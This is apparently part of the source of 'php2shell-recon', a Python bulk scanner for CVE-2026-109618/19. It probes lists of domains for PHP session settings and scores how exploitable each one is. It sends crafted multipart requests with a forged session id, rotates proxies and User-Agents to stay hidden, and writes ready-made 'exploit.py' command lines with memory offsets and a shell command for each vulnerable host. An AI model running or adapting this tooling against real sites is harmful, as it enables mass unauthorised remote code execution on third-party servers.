            f'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\nhello\r\n"
            f"--{boundary}--\r\n"
        ).encode("latin-1", "replace")
        out = await self.http.post(
            url, body=body,
            headers={"Content-Type":
                     f"multipart/form-data; boundary={boundary}"})
        if not out["ok"]:
            return
        setc = out["headers"].get("set-cookie", "")
        if SID_RE.search(setc.encode("latin-1", "replace")):
            rec.session_upload_progress = True
            rec.session_use_cookies = True
            rec.notes.append("P4: upload_progress + use_cookies ON")
        else:
            rec.session_upload_progress = False
            rec.notes.append("P4: NO_UPLOAD_PROGRESS")

    async def p5_strict_mode(self, url: str, rec: Rec) -> None:
        if rec.phpinfo_path:
            return
        if not self.spend(1):
            return
        boundary = "----php2shellprobe2"
        fake_id = "attacksessionid0001abcd"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"{fake_id}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; '
            f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
            f"--{boundary}--\r\n"
        ).encode("latin-1", "replace")
        out = await self.http.post(
            url, body=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={fake_id}",
            })
        if not out["ok"]:
            return
        setc = out["headers"].get("set-cookie", "")
        m = SID_RE.search(setc.encode("latin-1", "replace"))
        if m:
            returned = m.group(1).decode("latin-1", "replace")
            if returned == fake_id:
                rec.session_use_strict_mode = False
            else:
                rec.session_use_strict_mode = True


# ------------------------------------------------------------------ target
async def process_target(host: str, http: HTTP, args,
                        done: set[str], queue: asyncio.Queue,
                        write: asyncio.Queue) -> None:
    rec = Rec(host=host)
    t0 = time.time()
    u = urlparse(host)
    if not u.netloc:
        base_url = f"https://{host}"
    else:
        base_url = host if host.startswith("http") else f"https://{host}"

    url_used = None
    if base_url.startswith("http://"):
        url_used = base_url
        rec.scheme = "http"
    else:
        rec.scheme = "https"
        url_used = base_url
        if not args.no_tls_fallback:
            r = await http.get(url_used)
            if not r["ok"] and r["error"] and (
                    "SSLError" in r["error"] or "ssl" in r["error"].lower()
                    or "ConnectionRefused" in r["error"]
                    or "ConnectionReset" in r["error"]):
                http_url = base_url.replace("https://", "http://", 1)
                r2 = await http.get(http_url)
                if r2["ok"]:
                    url_used = http_url
                    rec.scheme = "http"
                    base_url = http_url

    probes = Probes(http, args)
    try:
        has_info = await probes.fingerprint(url_used, rec)
        if args.probe_post_max:
            await probes.p1_display_postmax(url_used, rec)
        await probes.p3_max_input_vars(url_used, rec)
        await probes.p4_upload_progress(url_used, rec)
        await probes.p5_strict_mode(url_used, rec)
        if args.probe_memory:
            await probes.p2_memory_limit(url_used, rec)
    except Exception as e:
        rec.error = repr(e)
    finally:
        rec.probed_at = datetime.datetime.now(
            datetime.timezone.utc).isoformat()
        rec.duration_ms = int((time.time() - t0) * 1000)
        score(rec)
        rec.suggested_exploit_args = suggest_args(rec)

    await put_result(write, rec)
    await http.close(urlparse(url_used).hostname or host)


async def put_result(write: asyncio.Queue, rec: Rec) -> None:
    await write.put(rec)


# ------------------------------------------------------------------ driver
class Driver:
    def __init__(self, args):
        self.args = args
        self.done: set[str] = set()
        self.results: list[Rec] = []
        self.lock = asyncio.Lock()
        self.cancelled = False
        self._out_fh: Any = None
        self._write_q: asyncio.Queue = asyncio.Queue()

    def load_done(self) -> None:
        p = self.args.out
        if os.path.exists(p):
            with open(p, "r", encoding="utf-8") as f:
                for ln in f:
                    ln = ln.strip()
                    if not ln:
                        continue
                    try:
                        d = json.loads(ln)
                        if "host" in d:
                            self.done.add(d["host"])
                    except Exception:
                        pass

    async def writer(self) -> None:
        mode = "a" if self.args.jsonl_append else "w"
        with open(self.args.out, mode, encoding="utf-8", buffering=1) as f:
            while True:
                item = await self._write_q.get()
                if item is None:
                    break
                rec = item
                self.results.append(rec)
                self.done.add(rec.host)
                f.write(json.dumps(rec.to_dict(), ensure_ascii=False) + "\n")
                if not self.args.quiet:
                    print(f"[{rec.verdict:10}] {rec.host:40} "
                          f"php={rec.php_version or '?':10} "
                          f"sapi={rec.sapi or '?':8} "
                          f"score={rec.exploitability_score}", flush=True)

    async def run(self) -> None:
        if self.args.jsonl_append:
            self.load_done()
        else:
            with open(self.args.out, "w", encoding="utf-8"):
                pass
        targets: list[str] = []
        with open(self.args.input, "r", encoding="utf-8",
                  errors="replace") as f:
            for ln in f:
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                if (ln.lower().startswith("http://")
                        and not self.args.include_http):
                    continue
                host = urlparse(ln).netloc or ln
                if host in self.done:
                    continue
                targets.append(ln)
        if not self.args.quiet:
            print(f"Targets: {len(targets)} (skipped: {len(self.done)})")
            if _HAVE_UVLOOP:
                print("[+] Engine: uvloop activated (high performance)")
            if self.args.proxy or getattr(self.args, 'proxy_file', None):
                print("[+] Proxy routing: enabled")
            if getattr(self.args, 'random_ua', False):
                print("[+] Stealth: randomized browser headers and UA pool active")

        http = HTTP(self.args)
        sem = asyncio.Semaphore(self.args.concurrency)
        tasks: list[asyncio.Task] = []

        async def work(t: str) -> None:
            async with sem:
                if self.cancelled:
                    return
                await process_target(t, http, self.args,
                                     self.done, self._write_q, self._write_q)

        for t in targets:
            if self.cancelled:
                break
            tasks.append(asyncio.create_task(work(t)))

        loop = asyncio.get_running_loop()

        def _sig():
            if not self.args.quiet:
                print("\n[!] Interrupted - writing partial results...", flush=True)
            self.cancelled = True

        for sigc in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sigc, _sig)
            except Exception:
                pass

        writer_task = asyncio.create_task(self.writer())
        await asyncio.gather(*tasks, return_exceptions=True)
        await self._write_q.put(None)
        await writer_task

    def summarize(self) -> None:
        from collections import Counter
        c: Counter = Counter(r.verdict for r in self.results)
        total = len(self.results)
        if not self.args.quiet:
            print("\n" + "=" * 50, flush=True)
            print(f"TOTAL: {total}", flush=True)
            for k, v in c.most_common():
                print(f"  {k}: {v}", flush=True)
            greens = sorted(
                (r for r in self.results if r.verdict == "GREEN"),
                key=lambda r: -r.exploitability_score)[:20]
            if greens:
                print("\nTop 20 GREEN targets:", flush=True)
                for r in greens:
                    print(f"  {r.exploitability_score:3} {r.url_used}", flush=True)
            print("=" * 50, flush=True)

        with open("green_targets.txt", "w", encoding="utf-8") as f:
            for r in self.results:
                if r.verdict != "GREEN" or not r.suggested_exploit_args:
                    continue
                a = r.suggested_exploit_args
                f.write(
                    f"python3 exploit.py {a.get('-u','')}"
                    f" --offsets-file ''"
                    f" --zif-offset {a.get('--zif-offset','0x465370')}"
                    f" --dtor-offset {a.get('--dtor-offset','0x65eb60')}"
                    f" --huge-mb {a.get('--huge-mb',12)}"
                    f" --retries 30 --proof-file ''"
                    f" --fetch {a.get('--fetch','/x')} -c 'id>x'\n")
        if self.args.summary:
            with open(self.args.summary, "w", newline="",
                      encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["verdict", "host", "php_version", "score"])
                for r in sorted(self.results,
                                key=lambda x: -x.exploitability_score):
                    w.writerow([r.verdict, r.host,
                                r.php_version or "", r.exploitability_score])
        if not self.args.quiet:
            print(f"Results: {self.args.out}", flush=True)
            print("Green targets: green_targets.txt", flush=True)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell-recon: bulk target scanner for CVE-2026-109618/19")
    ap.add_argument("--input", required=True, help="domain list (one per line)")
    ap.add_argument("--out", default="results.jsonl",
                    help="output JSONL (overwrites unless --jsonl-append is used)")
    ap.add_argument("--concurrency", type=int, default=30)
    ap.add_argument("--timeout", type=float, default=12)
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--ua", default=None, help="custom User-Agent string")
    ap.add_argument("--random-ua", action="store_true",
                    help="enable realistic browser header & User-Agent rotation")
    ap.add_argument("--insecure", action="store_true",
                     help="disable TLS certificate verification")
    ap.add_argument("--rate", type=float, default=0,
                     help="N requests per second per host (0=unlimited)")
    ap.add_argument("--probe-budget", type=int, default=24,
                     help="maximum N probes per host")
    ap.add_argument("--jsonl-append", action="store_true",
                     help="append to the existing JSONL file")
    ap.add_argument("--max-body", type=int, default=2_000_000,
                     help="response body limit (bytes)")
    ap.add_argument("--include-http", action="store_true",
                    help="include explicit HTTP targets (default: skip them)")
    ap.add_argument("--no-tls-fallback", action="store_true",
                     help="fall back to HTTP on TLS errors")
    ap.add_argument("--summary", default=None,
                    help="summary CSV path")
    ap.add_argument("--proxy", default=None,
                    help="single HTTP/SOCKS5 proxy (e.g. socks5://127.0.0.1:9050 or http://proxy:8080)")
    ap.add_argument("--proxy-file", default=None,
                    help="path to file containing list of proxies for rotation")
    ap.add_argument("--probe-memory", action="store_true",
                    help="allow the P2 memory_limit probe")
    ap.add_argument("--probe-post-max", action="store_true",
                    help="allow the P1 post_max_size probe")
    ap.add_argument("--probe-error-page", action="store_true",
                    help="actively probe non-existent PHP endpoint to capture error banners")
    ap.add_argument("-q", "--quiet", action="store_true",
                     help="quiet mode")
    args = ap.parse_args()

    drv = Driver(args)
    try:
        asyncio.run(drv.run())
    except KeyboardInterrupt:
        if not args.quiet:
            print("\n[!] Interrupted", flush=True)
    drv.summarize()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
